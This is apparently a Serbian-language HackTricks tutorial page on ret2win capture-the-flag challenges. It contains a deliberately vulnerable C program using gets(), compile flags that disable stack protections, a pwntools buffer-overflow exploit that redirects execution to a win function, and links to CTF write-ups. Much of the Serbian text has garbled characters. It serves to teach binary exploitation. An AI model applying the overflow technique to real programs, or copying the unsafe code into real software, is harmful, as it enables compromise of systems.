# Ret2win

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne Informacije

**Ret2win** izazovi su popularna kategorija u takmi캜enjima **Capture The Flag (CTF)**, posebno u zadacima koji uklju캜uju **binarno eksploatisanje**. Cilj je iskoristiti ranjivost u datom binarnom fajlu kako bi se izvr코ila odre캠ena, neizvr코ena funkcija unutar binarnog fajla, 캜esto nazvana ne코to poput `win`, `flag`, itd. Ova funkcija, kada se izvr코i, obi캜no ispisuje zastavu ili poruku o uspehu. Izazov obi캜no uklju캜uje prepisivanje **adrese povratka** na steku kako bi se preusmerio tok izvr코avanja ka 쬰ljenoj funkciji. Evo detaljnijeg obja코njenja sa primerima:

### Primer u C-u

Razmotrimo jednostavan C program sa ranjivo코캖u i `win` funkcijom koju nameravamo pozvati:
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
Da biste kompajlirali ovaj program bez za코tite steka i sa **ASLR** onemogu캖enim, mo쬰te koristiti slede캖u komandu:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-m32`: Kompajliraj program kao 32-bitni binarni fajl (ovo je opcionalno ali 캜esto se koristi u CTF izazovima).
* `-fno-stack-protector`: Onemogu캖i za코titu od preplavljivanja steka.
* `-z execstack`: Dozvoli izvr코avanje koda na steku.
* `-no-pie`: Onemogu캖i izvr코avanje nezavisno od pozicije kako bi se osiguralo da adresa funkcije `win` ne promeni.
* `-o vulnerable`: Nazovi izlazni fajl `vulnerable`.

### Python Eksploatacija kori코캖enjem Pwntools

Za eksploataciju, koristi캖emo **pwntools**, mo캖an CTF okvir za pisanje eksploata. Skripta za eksploataciju 캖e kreirati payload za preplavljivanje bafera i prepisati povratnu adresu sa adresom funkcije `win`.
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
Da biste prona코li adresu funkcije `win`, mo쬰te koristiti **gdb**, **objdump**, ili bilo koji drugi alat koji vam omogu캖ava da pregledate binarne datoteke. Na primer, sa `objdump`-om, mo쬰te koristiti:
```sh
objdump -d vulnerable | grep win
```
Ova komanda 캖e vam prikazati sklop `win` funkcije, uklju캜uju캖i njenu po캜etnu adresu.

Python skripta 코alje pa쬷jivo oblikovanu poruku koja, kada je obra캠ena od strane `vulnerable_function`, preplavljuje bafer i prepisuje adresu povratka na steku adresom `win`. Kada `vulnerable_function` zavr코i, umesto vra캖anja na `main` ili izlaska, prelazi na `win`, i poruka se ispisuje.

## Za코tite

* **PIE** treba biti onemogu캖en da bi adresa bila pouzdana tokom izvr코avanja ili adresa na kojoj 캖e funkcija biti sme코tena ne캖e uvek biti ista i treba캖e vam neko curenje informacija da biste saznali gde je sme코tena win funkcija. U nekim slu캜ajevima, kada funkcija koja uzrokuje preplavljivanje je `read` ili sli캜na, mo쬰te izvr코iti **Delimi캜no prepisivanje** od 1 ili 2 bajta da biste promenili adresu povratka da bude win funkcija. Zbog toga kako ASLR funkcioni코e, poslednje tri heksadecimalne cifre nisu nasumi캜ne, tako da postoji **1/16 코ansa** (1 heksadecimalna cifra) da dobijete ispravnu adresu povratka.
* **Stack Canaries** tako캠e treba da budu onemogu캖eni ili kompromitovana EIP adresa povratka nikada ne캖e biti pra캖ena.

## Ostali primeri i Reference

* [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)
* [https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html](https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html)
* 32 bit, bez ASLR-a
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html)
* 64 bita sa ASLR-om, sa curenjem bin adrese
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html)
* 64 bita, bez ASLR-a
* [https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html)
* 32 bita, bez ASLR-a, dvostruko malo preplavljivanje, prvo da preplavi stek i pove캖a veli캜inu drugog preplavljivanja
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32 bita, relro, bez canary-a, nx, bez pie-a, formatiranje stringa za prepisivanje adrese `fflush` sa win funkcijom (ret2win)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html)
* 32 bita, nx, ni코ta drugo, delimi캜no prepisivanje EIP-a (1 bajt) da bi se pozvala win funkcija
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html)
* 32 bita, nx, ni코ta drugo, delimi캜no prepisivanje EIP-a (1 bajt) da bi se pozvala win funkcija
* [https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html](https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html)
* Program samo validira poslednji bajt broja da proveri veli캜inu unosa, stoga je mogu캖e dodati bilo koju veli캜inu sve dok je poslednji bajt unutar dozvoljenog opsega. Zatim, unos stvara preplavljivanje bafera koje se eksploati코e sa ret2win.
* [https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/](https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/)
* 64 bita, relro, bez canary-a, nx, pie. Delimi캜no prepisivanje da bi se pozvala win funkcija (ret2win)
* [https://8ksec.io/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain/](https://8ksec.io/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain/)
* arm64, PIE, daje PIE curenje win funkcije koja zapravo ima 2 funkcije pa ROP ged쬰t koji poziva 2 funkcije
* [https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/)
* ARM64, off-by-one da pozove win funkciju

## Primer za ARM64

{% content-ref url="ret2win-arm64.md" %}
[ret2win-arm64.md](ret2win-arm64.md)
{% endcontent-ref %}

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
